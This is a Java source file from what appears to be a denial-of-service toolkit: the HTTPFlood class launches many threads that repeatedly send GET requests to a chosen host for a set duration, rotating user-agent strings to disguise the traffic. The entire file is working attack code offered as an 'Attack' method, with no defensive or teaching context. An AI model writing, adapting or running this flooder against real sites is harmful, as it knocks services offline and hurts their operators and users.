/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package org.willi.dos.methods;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.SocketTimeoutException;
import java.net.URL;
import org.willi.dos.interfaces.Attack;
import org.willi.dos.methods.AttackMethod;
import org.willi.dos.useragent.UserAgent;

/**
 *
 * @author phamm
 */
public class HTTPFlood extends AttackMethod implements Attack 
{
    public HTTPFlood(String host, int threads, int duration)
    {
        super(host, threads, duration);
    }

    @Override
    public void startAttack()
    {
        //TODO: UDPFlood, HTTPFlood implementieren.
        int duration = super.getDuration();
        String host = super.getHost().startsWith("http") ? super.getHost() : "http://"+super.getHost();
        
        for(int i = 0; i <= super.getThreads(); i++)
        {
            new Thread(new Runnable()
            {
                @Override
                public void run()
                {
                    long endtime = System.currentTimeMillis() + (duration*1000);
                    while(System.currentTimeMillis() < endtime)
                    {
                        try
                        {
                            HttpURLConnection.setFollowRedirects(false);
                            HttpURLConnection conn = (HttpURLConnection) new URL(host).openConnection();
                           //System.out.println(new URI(InetAddress.getByName(host).getHostName()).toURL().openConnection());
                            conn.setRequestMethod("GET");
                            conn.setRequestProperty("user-agent", UserAgent.getUserAgent());
                            conn.getResponseCode();
                            conn = null;
                            try
                            {
                                Thread.sleep(1);
                            }
                            catch(InterruptedException i)
                            {
                                
                            }
                        } 
                        catch (MalformedURLException ex)
                        {
                            ex.printStackTrace();
                        } 
                        catch (IOException ex)
                        {
                            ex.printStackTrace();
                        } 
                    }
                }
            }).start();
        }
    }
 
}
